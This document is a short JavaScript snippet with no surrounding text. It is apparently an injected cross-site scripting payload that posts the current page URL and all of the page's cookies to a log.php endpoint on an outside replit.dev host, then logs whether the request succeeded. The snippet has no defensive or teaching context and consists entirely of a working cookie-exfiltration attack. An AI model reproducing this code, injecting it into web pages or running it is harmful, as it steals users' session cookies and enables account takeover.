fetch("https://82baaa40-4287-4080-8659-5764961ba3aa-00-1wyczbued8hx2.pike.replit.dev/log.php", {
  method: "POST",
  body: "URL: " + window.location.href + " | Cookie: " + document.cookie
})
.then(() => console.log("Fetch succeeded"))
.catch(e => console.error("Fetch failed:", e));
